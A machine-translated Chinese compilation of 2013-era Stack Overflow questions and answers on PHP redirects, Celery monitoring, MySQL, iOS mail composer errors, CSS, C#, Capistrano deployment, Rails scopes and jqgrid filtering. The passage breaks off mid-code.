我正在慢慢掌握 PHP，但是很难分解我的 if 语句，以便我的标题函数工作。我已经做了一些，但它们并没有像我的密码恢复文件那样涉及那么多条件。有人可以告诉我我该怎么做吗？

```
<?php
include ("storescripts/init.php");
logged_in_redirect();
include ("includes/overall/head.php");?>
<?php include ("includes/overall/template_header.php");?>
<div id="mainDivShort">
<h1>Recover</h1>
<div id="divBreak"></div>
<?php include ("includes/overall/column_left.php");?>
<div id="middleContent">
    <?php 
    if(isset($_GET['success']) === true && empty($_GET['success']) === true){
        ?>
    <p>Thanks, we've emailed you.</p>
    <?php
        } else {
            $mode_allowed = array('mem_password');
            if (isset($_GET['mode']) === true && in_array($_GET['mode'],  $mode_allowed) === true) {
            if(isset($_POST['mem_email']) === true && empty($_POST['mem_email']) === false) {
                if (email_exists($_POST['mem_email']) === true) {
                    recover($_GET['mode'], $_POST['mem_email']);
                    header('Location: recover.php?success');
                    exit();
                } else {
                    echo '<p>Oops, we couldn\'t find that email in the system</p>';
                }
            }
            ?>
    <form action="" method="post">
        <ul>
            <li>Please enter your email address:<br> <input type="text"
                name="mem_email">
            </li>
            <li><input type="submit" value="Recover"></li>
        </ul>
    </form>
    <?php
        } else {
            header('Location: index.php');
            exit();
        }
        }
        ?>
</div>
<?php include ("includes/overall/column_right.php");?>
</div>
<?php include ("includes/overall/template_footer.php");?> 
```

标题语句需要在我的 include head.php 之上，因为这包括 HTML 输出。我已经尝试过缓冲，但这对我不起作用！谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T14:16:40.407

```
<?php
ob_start(); // We start the buffer
include ("storescripts/init.php");
logged_in_redirect();
include ("includes/overall/head.php");?>
<?php include ("includes/overall/template_header.php");?>
<div id="mainDivShort">
<h1>Recover</h1>
<div id="divBreak"></div>
<?php include ("includes/overall/column_left.php");?>
<div id="middleContent">
    <?php 
    if(isset($_GET['success']) === true && empty($_GET['success']) === true){
        ?>
    <p>Thanks, we've emailed you.</p>
    <?php
        } else {
            $mode_allowed = array('mem_password');
            if (isset($_GET['mode']) === true && in_array($_GET['mode'],  $mode_allowed) === true) {
            if(isset($_POST['mem_email']) === true && empty($_POST['mem_email']) === false) {
                if (email_exists($_POST['mem_email']) === true) {
                    ob_clean(); // Clean the buffer and make the redirect
                    recover($_GET['mode'], $_POST['mem_email']);
                    header('Location: recover.php?success');
                    exit();
                } else {
                    echo '<p>Oops, we couldn\'t find that email in the system</p>';
                }
            }
            ?>
    <form action="" method="post">
        <ul>
            <li>Please enter your email address:<br> <input type="text"
                name="mem_email">
            </li>
            <li><input type="submit" value="Recover"></li>
        </ul>
    </form>
    <?php
        } else {
            ob_clean();// Clean the buffer and make the redirect
            header('Location: index.php');
            exit();
        }
        }
        ?>
</div>
<?php include ("includes/overall/column_right.php");?>
</div>
<?php include ("includes/overall/template_footer.php");?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T14:07:20.590

```
<?php
$msg = "";    
if (!empty($_GET)) //check if form has been submitted
{  
   if(isset($_GET['success']) === true && empty($_GET['success']) === true)
   {
      $msg = "Thanks, we've emailed you.";
   } 
   else 
   {
      $mode_allowed = array('mem_password');
      if (isset($_GET['mode']) === true && in_array($_GET['mode'],  $mode_allowed) === true) 
      {
         if(isset($_POST['mem_email']) === true && empty($_POST['mem_email']) === false) 
         {
            if (email_exists($_POST['mem_email']) === true) 
            {
              recover($_GET['mode'], $_POST['mem_email']);
              header('Location: recover.php?success');
              exit();
            } 
            else 
            {
              $msg = "<p>Oops, we couldn\'t find that email in the system</p>";
            }
         }
      } 
      else 
      {
         header('Location: index.php');
         exit();
      }
   }
}

include 'storescripts/init.php';
logged_in_redirect();
include 'includes/overall/head.php';
include 'includes/overall/template_header.php';
 ?>
<div id="mainDivShort">
<h1>Recover</h1>
<div id="divBreak"></div>
<?php include ("includes/overall/column_left.php");?>
<div id="middleContent">
<?php echo $msg; ?>
<form action="" method="post">
    <ul>
        <li>Please enter your email address:<br> <input type="text"
            name="mem_email">
        </li>
        <li><input type="submit" value="Recover"></li>
    </ul>
</form>
</div>
<?php include ("includes/overall/column_right.php");?>
</div>
<?php include ("includes/overall/template_footer.php");?> 
```

你不是已经在这里解决了吗？[重新排列 PHP 页面，使标题位于 HTML 之前](https://stackoverflow.com/questions/15147163/rearranging-php-page-so-header-is-before-html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T14:36:29.627

您可能不知道的是，一旦第一个字符被回显出来，php 就会发送一个标题......第一个字符甚至可以是空格，如 lf 或 tab 或 cr。等等

一旦第一个标头消失，您计划发送的其他标头将不再计算在内......因此，您混合使用文本 html 和使用标签可能会伤害您。因为 php 标记之外的第一位空白将生成一个标题，并且您计划的标题将不再计算在内。

我可以更进一步，建议您开始使用模板系统将代码与内容分开。

# linkedin - 在 IN.API.Raw 中链接

> ID：15159391
> 
> 赞同：0
> 
> 时间：2013-03-01T13:53:29.720
> 
> 标签：linkedin, linkedin-jsapi

```
/people-search:(people:(id,first-name,last-name,date-of-birth,summary,industry,group-memberships,job-bookmarks,interests,associations,public-profile-url,picture-url,headline))?keyword=retail&count=500 
```

上面的搜索让我得到了我所有的联系，当它只是为了得到零售的那些。

```
?keyword=cytdcytxyrtr4dftubiugiuguukjkjp 
```

这也一样...

我很高兴得到“a”结果，但为什么 params 不起作用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-10T07:04:52.737

我认为这是“关键字”的复数形式。这能解决问题吗？

# python - 如何在 Celery-Django 应用程序中监视来自工作人员的事件？

> ID：15159394
> 
> 赞同：13
> 
> 时间：2013-03-01T13:53:36.323
> 
> 标签：python, monitor, django-celery

根据 celery 关于[实时监控 celery 工人](http://docs.celeryproject.org/en/latest/userguide/monitoring.html#guide-monitoring)的教程，还可以通过编程方式捕获工人产生的事件并采取相应的行动。

我的问题是如何在 Celery-Django 应用程序中集成一个监视器作为[本示例中的监视器？](http://docs.celeryproject.org/en/latest/userguide/monitoring.html#real-time-processing)

编辑：教程中的代码示例如下所示：

```
from celery import Celery

def my_monitor(app):
    state = app.events.State()

    def announce_failed_tasks(event):
        state.event(event)
        task_id = event['uuid']

        print('TASK FAILED: %s[%s] %s' % (
            event['name'], task_id, state[task_id].info(), ))
    with app.connection() as connection:
        recv = app.events.Receiver(connection, handlers={
                'task-failed': announce_failed_tasks,
                'worker-heartbeat': announce_dead_workers,
        })
        recv.capture(limit=None, timeout=None, wakeup=True)

if __name__ == '__main__':
    celery = Celery(broker='amqp://guest@localhost//')
    my_monitor(celery) 
```

所以我想捕获工作人员发送的 task_failed 事件，并像教程所示那样获取它的 task_id，从为我的应用程序配置的结果后端获取此任务的结果并进一步处理它。我的问题是如何获取应用程序对我来说并不明显，因为在 django-celery 项目中，Celery 库的实例化对我来说并不透明。

我也愿意接受任何其他关于在工作人员完成执行任务时如何处理结果的想法。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-03-19T11:46:31.093

好的，我找到了一种方法，虽然我不确定这是否是解决方案，但它对我有用。监视器功能基本上直接连接到代理并监听不同类型的事件。我的代码如下所示：

```
from celery.events import EventReceiver
from kombu import Connection as BrokerConnection

def my_monitor:
    connection = BrokerConnection('amqp://guest:guest@localhost:5672//')

    def on_event(event):
        print "EVENT HAPPENED: ", event

    def on_task_failed(event):
        exception = event['exception']
        print "TASK FAILED!", event, " EXCEPTION: ", exception

    while True:
        try:
            with connection as conn:
                recv = EventReceiver(conn,
                                 handlers={'task-failed' : on_task_failed,
                                           'task-succeeded' : on_event,
                                           'task-sent' : on_event,
                                           'task-received' : on_event,
                                           'task-revoked' : on_event,
                                           'task-started' : on_event,
                                           # OR: '*' : on_event
                                           })
            recv.capture(limit=None, timeout=None)
    except (KeyboardInterrupt, SystemExit):
        print "EXCEPTION KEYBOARD INTERRUPT"
        sys.exit() 
```

这是所有的了。我在与普通应用程序不同的进程中运行它，这意味着我为我的 celery 应用程序创建了一个子进程，它只运行这个函数。高温高压

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2015-09-08T04:24:25.023

当心几个陷阱

1.  您需要`CELERY_SEND_EVENTS`在 celery 配置中将 flag 设置为 true。
2.  您还可以在工作人员的新线程中设置事件监视器。

这是我的实现：

```
class MonitorThread(object):
    def __init__(self, celery_app, interval=1):
        self.celery_app = celery_app
        self.interval = interval

        self.state = self.celery_app.events.State()

        self.thread = threading.Thread(target=self.run, args=())
        self.thread.daemon = True
        self.thread.start()

    def catchall(self, event):
        if event['type'] != 'worker-heartbeat':
            self.state.event(event)

        # logic here

    def run(self):
        while True:
            try:
                with self.celery_app.connection() as connection:
                    recv = self.celery_app.events.Receiver(connection, handlers={
                        '*': self.catchall
                    })
                    recv.capture(limit=None, timeout=None, wakeup=True)

            except (KeyboardInterrupt, SystemExit):
                raise

            except Exception:
                # unable to capture
                pass

            time.sleep(self.interval)

if __name__ == '__main__':
    app = get_celery_app() # returns app
    MonitorThread(app)
    app.start() 
```

# mysql - 一次检索数据库中所有表的 MAX 主键值

> ID：15159408
> 
> 赞同：7
> 
> 时间：2013-03-01T13:54:09.883
> 
> 标签：mysql, database

我需要做的是一次检索数据库中所有表的最大主**键**？也就是说，如果我执行以下 2 个查询，我的结果将是这样的：

```
SHOW TABLES FROM DATABASE_NAME

SELECT MAX(PRIMARY_KEY) AS maxId FROM TABLE 
```

那是

```
(first column = TableName , second column = MAX(PK) Of that table) 
```

请原谅我做错了什么。我只是不想写 80 个查询，因为我的数据库有 80 个表。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-03-01T13:57:56.493

如果（且仅当）您的主键是`AUTO INCREMENT`变量，您可以这样做：

```
SELECT TABLE_NAME, AUTO_INCREMENT
FROM   information_schema.TABLES
WHERE  TABLE_SCHEMA = 'mydb' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-12-16T09:03:31.767

在选择检索该信息的方法以及您将如何处理时，请注意以下情况：

AUTO_INCREMENT 值存储在内存中，因此在服务器重新启动后，AUTO_INCREMENT 值重置为：

```
SELECT MAX(ai_col) FROM table_name FOR UPDATE; 
```

如果数据库缺少 FK，这可能会破坏事情，例如，您删除了一些引用其他表的行。你最终会重用相同的 id。

参考：[https ://dev.mysql.com/doc/refman/5.7/en/innodb-auto-increment-handling.html#innodb-auto-increment-initialization](https://dev.mysql.com/doc/refman/5.7/en/innodb-auto-increment-handling.html#innodb-auto-increment-initialization)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-06-28T03:20:50.097

```
SELECT  table_schema, table_name, column_name, data_type, extra
    FROM  `columns`
    WHERE  table_schema = 'mydb'
      AND  extra LIKE '%auto_increment%' 
```

可以选择`JOIN`使用 Alnitak 的答案。

# ios - 使用 MFMailComposeViewController 时的问题

> ID：15159412
> 
> 赞同：27
> 
> 时间：2013-03-01T13:54:14.947
> 
> 标签：ios, objective-c, mfmailcomposeviewcontroller, mfmailcomposer

我有一个棘手的问题。在我的一个应用程序中，下载量超过 150.000 次……我遇到了一个很少发生的问题，而且我似乎无法弄清楚。

问题如下：在用户可以通过电子邮件共享列表的视图中，我使用`MFMailComposeViewController`. 但是，在少数情况下，该应用程序似乎在使用邮件编辑器时遇到了问题。用户按下共享按钮，邮件窗口向上滑动，等待大约 1-2 秒，然后再次关闭。邮件窗口中没有内容，尽管我确实向它发送了数据。我自己无法在任何设备或模拟器中重现该问题，但一位同事却做到了。我在他的手机上使用 XCode 运行该应用程序，并在日志中得到以下信息：

```
2013-03-01 14:43:39.604 appname[318:907] <MFMailComposeRemoteViewController: 0x1ebfb100> timed out waiting for fence barrier from com.apple.MailCompositionService
2013-03-01 14:43:39.631 appname[318:907] viewServiceDidTerminateWithError: Error Domain=XPCObjectsErrorDomain Code=2 "The operation couldn’t be completed. (XPCObjectsErrorDomain error 2.)" 
```

我用谷歌搜索了错误“等待来自 com.apple.MailCompositionService 的栅栏屏障超时”，但找不到任何帮助。

有没有人有这方面的经验？我该如何解决？

我打开视图的代码：

```
-(void)displayComposerSheetWithBodyString:(NSString *)aBody
{
    if ([MFMailComposeViewController canSendMail])
    {
        MFMailComposeViewController *picker = [[MFMailComposeViewController alloc]init];
        picker.mailComposeDelegate = self;

        [picker setSubject:@"Lista"];

        NSString *emailBody = aBody;
        [picker setMessageBody:emailBody isHTML:NO];

        [self.navigationController presentModalViewController:picker animated:YES];
    }
    else
    {
        [[[UIAlertView alloc]initWithTitle:NSLocalizedString(@"Din enhet är inte redo att skicka e-post. Kontrollera dina inställningar", nil)
                                   message:nil
                                  delegate:self
                         cancelButtonTitle:NSLocalizedString(@"OK", nil)
                         otherButtonTitles:nil]
         show];
    }
} 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-06-18T08:00:09.763

不知道你是否已经解决了这个问题，但我最近在我的项目中遇到了它。

我所做的一种解决方法是**在早期阶段分配和启动 MFMailComposeViewController，并将其保存在一个静态变量**中，每当需要时，获取静态 MFMailComposeViewController 实例并呈现它。

它似乎对我有用，希望它也对你有用。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-11-11T15:46:15.837

a 有同样的问题，这个修复帮助了我：

[https://twitter.com/christian_beer/statuses/321295533077565440](https://twitter.com/christian_beer/statuses/321295533077565440)

“@nathangaskin 好吧……那是很久以前的事了 :) 但如果我没记错的话，在我从 UIAppearance 代码中删除自定义字体后它就起作用了”

这对我来说可以。

此外，第二种选择是将显示调用简单地包装到

```
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 0.3 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{ 
```

堵塞

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-03-20T22:20:41.423

我有完全相同的问题。我想我已经确定了制定消息正文字符串所需的时间。

***评论内容***

```
 //Message Body 
NSString *msgBody = [NSString stringWithFormat:
                        @"I noticed these results in pocketKPI. The %@ was at %@ which is a variance of %@(or %@) to the target defined as %@. When you have some time let's discuss.", 
                        self.itemToView.kpiName, 
                        [DFSKpiFormatter formatNumberAsString:self.itemToView.currentValue], [self.itemToView determineVarianceLabelText],
                        [self.itemToView determineVariancePercentLabelText], 
                        [DFSKpiFormatter formatNumberAsString:self.itemToView.targetValue]]; 
```

# html - 在 CSS 中为导航栏添加噪点纹理效果

> ID：15159420
> 
> 赞同：3
> 
> 时间：2013-03-01T13:54:42.817
> 
> 标签：html, css, twitter-bootstrap, noise

是否可以在 CSS 中向导航栏添加噪声层？像这个：

![在此处输入图像描述](../Images/a58c9f161f7869b87a3b518e6b2f1ac1.png)

使用 CSS 或背景图像（无需在 Photoshop 或类似工具中进行编辑。）

```
.navbar-inner {
  min-height: 40px;
  padding-right: 20px;
  padding-left: 20px;
  background-color: #fafafa;
  background-image: -moz-linear-gradient(top, #ffffff, #f2f2f2);
  background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#ffffff), to(#f2f2f2));
  background-image: -webkit-linear-gradient(top, #ffffff, #f2f2f2);
  background-image: -o-linear-gradient(top, #ffffff, #f2f2f2);
  background-image: linear-gradient(to bottom, #ffffff, #f2f2f2);
  background-repeat: repeat-x;
  border: 1px solid #d4d4d4;
  -webkit-border-radius: 4px;
     -moz-border-radius: 4px;
          border-radius: 4px;
  filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffffff', endColorstr='#fff2f2f2', GradientType=0);
  *zoom: 1;
  -webkit-box-shadow: 0 1px 4px rgba(0, 0, 0, 0.065);
     -moz-box-shadow: 0 1px 4px rgba(0, 0, 0, 0.065);
          box-shadow: 0 1px 4px rgba(0, 0, 0, 0.065);
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T13:57:28.223

只需设置一个无缝的`background-image: url('some-image.png');`. 在顶部添加文本可能会在没有`background`. 请注意，您只能使用 CSS3 添加渐变和阴影，而不能添加噪点。

[http://jsfiddle.net/AB7nv/](http://jsfiddle.net/AB7nv/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-01T14:41:27.117

CSS 目前不支持可靠地做到这一点的方法（尽管我认为应该有......）。我只是想指定，你想要一个小图像，然后只是重复它。

这是一个包含[许多示例的站点](http://lea.verou.me/css3patterns/#)

这是一个[自定义生成器](http://www.patternify.com/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T14:25:19.463

您可以在其上放置一个带有背景图像和不透明度 0.3 或其他内容的 div。

# c# - SQL CE 和数据集 - 行不存在

> ID：15159421
> 
> 赞同：0
> 
> 时间：2013-03-01T13:54:45.043
> 
> 标签：c#, dataset, sql-server-ce, asp.net-3.5

我（新手）正在使用 SQL CE 数据库，该数据库稍后将连接到一个项目，我们在该项目中通过 SerialPort 向设备发送和接收信息。该数据库将存储有关通信的每个部分的信息。在更新数据集并将这些更新的数据提交到数据库时，我有点卡住了。

```
data = new DataSet();
adapter = new SqlCeDataAdapter("SELECT * FROM " + [table_name])
builder = new SqlCeCommandBuilder(adapter);
adapter.Fill(data, [table_name]);

data.Tables[table_name].Rows[identity_value][a_column] = a_column_value;
adapter.Update(data, [table_name]); 
```

在我运行这个方法之前，我确保我在表中有一个标识值为 1 的记录。但是，`There is no row at position 1`在我调用 adapter.Update() 之前，我得到了一个 IndexOutOfRangeException。我假设我误解了如何使用和更新数据集。有什么建议吗？

在尝试更新行之前，我尝试查看数据集，但是调试器似乎不允许我查看数据集，有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T14:29:20.047

试试这个：

```
var rows = data.Tables[table_name].Select(String.Format("[Id] = {0}",identity_value));

if (rows.Length == 1)
{
    rows[0][a_column] = a_column_value;
} 
```

你在解释错误的财产`Rows`

```
data.Tables[table_name].Rows[ROWINDEX][COLUMNINDEX] 
```

ROWINDEX 是数组索引而不是标识

一条建议：

如果您必须使用[SqlCeDataAdapter.FillSchema](http://msdn.microsoft.com/en-us/library/system.data.sqlserverce.sqlcedataadapter.fillschema%28v=vs.100%29.aspx)`DataSet`加载表模式信息：

```
adapter.FillSchema(data.Tables[table_name], SchemaType.Mapped); 
```

`adapter.Fill(data, [table_name]);`这仅加载数据：

然后，如果您在 中至少有一列指定为主键列，则`DataTable`可以使用[DataRowCollection.Find Method](http://msdn.microsoft.com/en-us/library/ydd48eyk.aspx)获取该行：

```
DataRow foundRow = data.Tables[table_name].Rows.Find(identity_value); 
```

# github - capistrano 和 ec2 和 github - 无法部署

> ID：15159423
> 
> 赞同：1
> 
> 时间：2013-03-01T13:54:49.103
> 
> 标签：github, ruby-on-rails-3.2, capistrano

我正在尝试使用 capistrano 将我的第一个 webapp 部署到 EC2，并且 repo 在 github 上。但我面临“上限部署：冷”的问题。deploy.rb 粘贴在下面。以下是我遵循的步骤。

1) 从我的本地机器上使用 ssh 登录到 ec2 实例。使用 ssh-keygen 生成的密钥，没有任何密码。

2) 获取 id_rsa.pub 的内容并复制到 github repo 设置部署密钥。

3）然后从我的本地机器上运行“cap deploy：cold”。我收到以下错误

user1@laptop:~/MyExample$ cap deploy:cold * 2013-03-01 19:08:06 执行deploy:update' ** 事务：开始 * 2013-03-01 19:08:06 执行 `deploy:update_code'更新本地执行的所有服务器上的缓存结帐：“git ls-remote git@github.com:user1/MyExample.git HEAD”权限被拒绝（公钥）。致命：远程端意外挂断 *** [deploy:update_code] 回滚 * 执行“rm -rf /var/www/MyExample.com/releases/20130301133835; true” 服务器：[“181.73.124.219”] [181.73.124.219 ] 执行命令命令在 1186 毫秒内完成`deploy:cold'
* 2013-03-01 19:08:06 executing`

 ** * *

设置：应用程序，“MyExample.com”设置：scm，“git”设置：存储库，“git@github.com:thisuser/example.git”

default_run_options[:pty] = true

设置：用户，'ubuntu' 设置：use_sudo，真实设置：deploy_to，“/var/www/#{application}”设置：deploy_via，：remote_cache

角色：web，“181.73.124.219”角色：app，“181.73.124.219”角色：db，“181.73.124.219”，：primary => true

在“部署”之后，“部署：bundle_gems”之后 在“部署：捆绑宝石”之后，“部署：重新启动”

命名空间：部署执行任务：bundle_gems 执行“cd #{deploy_to}/current && bundle install vandor/gems”结束任务：开始执行；结束任务：停止做；结束任务 :restart, :roles => :app, :except => { :no_release => true } 运行 "#{try_sudo} touch #{File.join(current_path,'tmp','restart.txt')} "结束结束

我在这里想念什么？此外，任何指向可以提供详细步骤的 URL/博客的指针都会有所帮助。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:39:24.090

我设法让它工作。如日志中所见，在 **本地执行：“git ls-remote git@github.com:user1/MyExample.git HEAD”**

capistrano 正在尝试在本地机器上而不是在服务器上运行上述命令。在终端上运行上述命令也返回了相同的错误 - Permission denied (Public Key)。

所以我不得不将生成的 id_rsa 和 id_rsa.pub 从部署服务器复制到本地机器。复制后，通过运行“ssh-add /path/to/keys”将其添加到正在使用的 ssk 密钥中。

添加这些键后，我能够继续前进。*

# ruby-on-rails - Rails - 从具有 has_many 和 belongs_to 关系的不同模型中查询一个模型

> ID：15159428
> 
> 赞同：0
> 
> 时间：2013-03-01T13:55:06.367
> 
> 标签：ruby-on-rails, ruby

我并不完全清楚如何从 Rails 中的不同模型中查询模型数据。这些模型具有 has_many 和 belongs_to 关系。2 个模型是“Gear”和“line_item”。**Gear** has_many line_items 和**LineItem** belongs_to Gear。

我正在尝试做的是查询数据库中属于具有 NULL 或空白 cart_id （这是字段之一）的 Gear 对象的所有 line_items，然后计算它的可用性。因为在这种情况下，Gear 在存储在 line_item (start_date, end_date, start_hour, end_hour) 中的特定日期和时间租出......我没有在 Ruby 中进行大量高级查询，现在我没有确定我应该如何使用

*在齿轮模型中可枚举，如下所示：*

```
line_items.inject(0) {|line_item| line_item.where('line_items.cart_id' => NULL } 
```

*或者，如果我可以像这样在齿轮模型中使用范围：*

```
scope :availablegear, lambda { includes(:line_items).where('line_items.cart_id' => nil) } 
```

我知道两者的语法可能都不正确，所以我可以使用一些指导来说明使用什么以及如何使用它。

谢谢。

我的项目正在使用 Rails 3.2.0、Ruby 1.9.4 和 MySQL

用建议的答案编辑

```
class Gear < ActiveRecord::Base
  attr_accessible :title, :size, :price, :sub_category_id, :user_id, :image, :image_a, :image_b, :image_c, :image_d, :image_e, :image_f, :image_g, :image_h, :image_i, :remote_image_url, :color, :year, :latefee, :cancellation, :minrental, :policy, :about, :address, :city, :state, :zip, :country, :latitude, :longitude, :gmaps
  ...some code omitted for brevity
  has_many :line_items
  scope :availablegear, joins(:line_items).where(:line_items => {:cart_id => nil})
  ...some code omitted for brevity

end 
```

现在，当我启动 Rails 控制台并执行 ag = Gear.find(4) 然后执行 g.availablegear 时，出现以下错误：**NoMethodError: undefined method `availablegear' for #**

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T14:12:12.990

我认为您要查找的查询是

```
Gear.joins(:line_items).where(:line_items => {:cart_id => nil}) 
```

你可以把它放在`Gear`类的范围内：

```
class Gear< ActiveRecord::Base
  scope :available, joins(:line_items).where(:line_items => {:cart_id => nil})
end 
```

[您可以在Rails 查询指南](http://guides.rubyonrails.org/active_record_querying.html)中找到更多帮助（参见 11.3 以了解加入条件）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-02T01:32:01.520

如果您尝试取回订单项：

```
class Gear < ActiveRecord::Base
  has_many :line_items
end

class LineItem < ActiveRecord::Base
  belongs_to :gear

  scope :available, where(:cart_id => nil)
end 
```

然后如果你有装备，你可以打电话

```
gear.line_items.available 
```

这将返回属于`gear`且没有的行项目`cart_id`。

# visual-studio-2010 - 在 Visual Studio 2010 设计器中最大化 XAML

> ID：15159439
> 
> 赞同：2
> 
> 时间：2013-03-01T13:55:23.573
> 
> 标签：visual-studio-2010, design-time, cider

Visual Studio 设计器几乎从不使用我的任何视图/页面，我厌倦了等待它来决定它是否会（不可避免地）失败。

我什至不使用 VS 设计器，所以我正在寻找一种方法来简单地让 XAML 部分默认展开（无需首先打开文档）。

这甚至可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T13:57:43.237

可以只检查`"Always open documents in full XAML view"`VS2010设置中的选项..

`Tools -> Options -> Text Editor -> XAML - >Miscellaneous -> "Always open documents in full XAML view"`

![在此处输入图像描述](../Images/46b2846365cc74e415ee4f6f7c537460.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T13:58:03.793

去

**工具 > 选项 > 文本编辑器 > XAML > 其他**

我们有一个“始终以完整 XAML 视图打开文档”的选项。选中该框：

![在此处输入图像描述](../Images/f67f95620e916f4f09ec4cd2fad70084.png)

# java - 如何将相机意图流式传输到位图中

> ID：15159442
> 
> 赞同：0
> 
> 时间：2013-03-01T13:55:29.303
> 
> 标签：java, android

如何将我的相机数据流式传输到位图中？我想将它流式传输到位图中，然后创建一个可变位图并对其进行一些图像处理。我有两个问题 1）当我想留在我的应用程序中并在后台打开相机时，我的相机意图将我带到 Android 图像选择器 - 2）我不知道如何访问相机数据实时传播位图 ARGB 值。

我知道如何用相机意图拍照并使用这张照片来更新静态位图 - 但我正在寻找一些更动态的东西，不断更新位图。供参考 - 我永远不需要保存图像数据。我必须寻找逐帧更新。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T14:02:42.043

> 如何将我的相机数据流式传输到位图中？

通过`Camera`直接使用而不是调用第三方应用程序。

> 但我正在寻找具有不断更新位图的更动态的东西

执行此操作的唯一方法是处理来自`Camera`对象的预览帧。

# c# - 通过 C# 故障恢复点

> ID：15159448
> 
> 赞同：0
> 
> 时间：2013-03-01T13:55:48.377
> 
> 标签：c#, .net, restore-points

我的任务是找到所有旧的还原点（不仅包括系统还原点，还包括自定义应用还原点）并删除它们。我还必须知道它们的总大小和描述。我有两个解决方案： 1）在“C:\System Volume Information”冗余文件中查找并删除。在这种情况下，我没有任何关于此还原点的描述以显示给用户。2) 使用 System.Management.ManagementClass 获取有关还原点的信息。

```
var sysRestore = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions()); 
```

但在这种情况下，我没有总还原点大小。有什么想法吗？

# linq - linq to sql 类没有 dbml

> ID：15159449
> 
> 赞同：0
> 
> 时间：2013-03-01T13:55:53.813
> 
> 标签：linq, linq-to-sql, asp.net-mvc-4

我想知道是否可以在不使用实际 dbml 的情况下获取生成的类，例如 linq-to-sql 类为每个表生成类。我的情况如下：

我有一个 api，它从数据库中获取所有数据并将它们作为 json 返回。另一方面，我有一个应用程序正在检索该数据，但需要再次将其转换为正确的类才能正确使用它。当然，我可以自己编写所有具有所需属性的类。但是如果可以生成它们会很方便。应用程序不需要与数据库本身建立任何连接。这就是为什么我想通过不使用 dbml 来保护数据库。使用 dbml，连接是可能的。所以我只需要这些类将 json 转换为。

我可以这样做还是不可能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T14:17:46.050

You can use `T4` to generate the classes if that's what you need. [Oleg Sych](http://www.olegsych.com/2008/09/t4-tutorial-creatating-your-first-code-generator/) has a good series of tutorials for this.

Hope it helps!

# c# - 无法将 lambda 表达式转换为 bool 类型，因为它不是委托

> ID：15159450
> 
> 赞同：-4
> 
> 时间：2013-03-01T13:55:54.860
> 
> 标签：c#

无法将 lambda 表达式转换为 bool 类型，因为它不是委托我收到以下错误，请有人帮助我，

![在此处输入图像描述](../Images/3e78a841a8f9864af42d6a2f36d2c370.png)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-01T13:57:25.880

大于等于 is `>=`not `=>`，这就是您收到错误的原因。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-01T13:57:49.553

您的代码中有几个地方似乎您想使用比较运算符，但翻转了[运算符](http://msdn.microsoft.com/en-us/library/6a71f45d.aspx)。改变

`=> to >=`

'=>` 是 C# 用于指定[lamba 表达式](http://msdn.microsoft.com/en-us/library/bb397687.aspx)的语法。因此，您编写运算符的顺序很重要。

**更新**

`vastus3`根据您的评论，在 do 语句块之外无法访问该变量。要解决该错误，请将声明与其他声明一起上移：

`int vastus1, vastus2, vastus3;`

~~整数~~ `vastus3 = int.Parse(tekst1);`

# javascript - 为jqgrid的每一列添加过滤器

> ID：15159452
> 
> 赞同：17
> 
> 时间：2013-03-01T13:56:04.143
> 
> 标签：javascript, search, filter, jqgrid

我有一个`jqgrid`显示员工详细信息的过滤器，我想在每一列中添加一个过滤器，用户可以使用该过滤器输入公司名称，并且网格显示与网格中该过滤器匹配的所有员工行。

谷歌了很多，但没有成功。任何参考示例/链接都会有所帮助。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2013-03-01T16:15:38.433

当您在文本框中键入测试用例的名称时，您应该使用 filterToolbar 选项，您的数据将适合记录，这里是代码和工作[示例演示](http://jsfiddle.net/uQQn3/1/)

```
 var mydata = [
    {id:"1",invdate:"2010-05-24",name:"test",note:"note",tax:"10.00",total:"2111.00"} ,
    {id:"2",invdate:"2010-05-25",name:"test2",note:"note2",tax:"20.00",total:"320.00"},
    {id:"3",invdate:"2007-09-01",name:"test3",note:"note3",tax:"30.00",total:"430.00"},
    {id:"4",invdate:"2007-10-04",name:"blah",note:"stuff",tax:"10.00",total:"210.00"},

];
jQuery("#list").jqGrid({
data: mydata,
datatype: "local",
height: 150,
rowNum: 10,
rowList: [10,20,30],
   colNames:['Inv No','Date', 'Client', 'Amount','Tax','Total','Notes'],
   colModel:[
       {name:'id',index:'id', width:60, sorttype:"int"},
       {name:'invdate',index:'invdate', width:90, sorttype:"date", formatter:"date"},
       {name:'name',index:'name', width:100},
       {name:'amount',index:'amount', width:80, align:"right",sorttype:"float", formatter:"number"},
       {name:'tax',index:'tax', width:80, align:"right",sorttype:"float"},        
       {name:'total',index:'total', width:80,align:"right",sorttype:"float"},        
       {name:'note',index:'note', width:150, sortable:false}        
   ],
   pager: "#pager",
   viewrecords: true,
   autowidth: true,
